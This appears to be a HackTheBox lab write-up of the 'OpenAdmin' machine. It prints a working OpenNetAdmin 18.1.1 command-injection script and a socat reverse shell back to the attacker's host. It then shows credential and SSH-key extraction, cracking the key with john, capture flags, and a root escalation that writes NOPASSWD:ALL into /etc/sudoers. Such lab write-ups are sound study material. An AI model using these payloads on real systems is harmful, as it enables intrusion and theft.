---
title: "HackTheBox OpenAdmin Quick Writeup"
subtitle: ""
date: 2020-02-06T13:14:27-04:00
lastmod: 2020-05-29T13:14:27-04:00
draft: false
author: "Nathan Higley"
authorLink: ""
description: ""

tags: [writeup, hackthebox, hacking]
categories: [HackTheBox, Security]

hiddenFromHomePage: false
hiddenFromSearch: false

featuredImage: ""
featuredImagePreview: ""

toc:
  enable: true
math:
  enable: false
lightgallery: false
license: ""
---

# OpenAdmin

Box IP: 10.10.10.171 

## Enumeration


╰─$ sudo nmap -T1 -p 80,443 10.10.10.171
```
PORT    STATE  SERVICE
80/tcp  open   http
443/tcp closed https

Nmap done: 1 IP address (1 host up) scanned in 45.44 seconds

```

http://10.10.10.171/ona

ONA v18.1.1
```
#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

./ona.sh 10.10.10.171/ona/

Used socat to get a proper shell:
```
On my machine:
socat file:`tty`,raw,echo=0 tcp-listen:4040

On box:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.102:4040
```

Found: 
```
// If no user name is passed in then use dcm.pl as the login name                                                                                                                                                                           
// be careful as this currently does not require a password.                                                                                                                                                                                
// FIXME: this needs to go away as it is a backdoor.  allow it to be configurable at least?                                                                                                                                                 
// Start out the session as a guest with level 0 access.  This is for view only mode.                                                                                                                                                       
// You can enable or disable this by setting the "disable_guest" sysconfig option

```

Found: 
```
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,


```

Found:
```
mysql> SELECT * FROM users;
+----+----------+----------------------------------+-------+---------------------+---------------------+
| id | username | password                         | level | ctime               | atime               |
+----+----------+----------------------------------+-------+---------------------+---------------------+
|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 | 2020-02-07 05:49:35 | 2020-02-07 05:49:35 |
|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 | 2020-02-07 05:48:24 | 2020-02-07 05:48:24 |
+----+----------+----------------------------------+-------+---------------------+---------------------+

```

Admin password hash of "21232f297a57a5a743894a0e4a801fc3" is simply "admin"

Can now login to panel as admin.

jimmy@10.10.10.171 pass: n1nj4W4rri0R!

Found /var/www/internal/main.php:
```
php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>

```

Found after curling the file and finding port in /etc/apache2/sites-enabled/internal.conf

```
jimmy@openadmin:/var/www/internal$ curl localhost:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>

```

Convert the rsa key to a hash
/usr/share/john/ssh2john.py joanna.rsa > joanna.hash

Cracked the RSA Key with john:
```
╰─$ /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt joanna.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 6 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (joanna.rsa)
1g 0:00:00:06 DONE (2020-02-23 00:08) 0.1564g/s 2244Kp/s 2244Kc/s 2244KC/s     1990..*7¡Vamos!
Session completed

```


Password: bloodninjas

### Got Joanna

```
╰─$ ssh joanna@10.10.10.171 -i joanna.rsa                                                                                 255 ↵
Enter passphrase for key 'joanna.rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

```

Got user.txt:
```
joanna@openadmin:~$ cat user.txt
c9b2cf07d40807e62af62660f0c81b5f

```

Time to exploit nano:
```
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv

```

Easiest way:

```
joanna ALL=(ALL) NOPASSWD:ALL
```

Save to /etc/sudoers

### Got Root

Then just execute 'sudo su':

```
root@openadmin:~# cat root.txt
2f907ed450b361b2c2bf4e8795d5b561

```
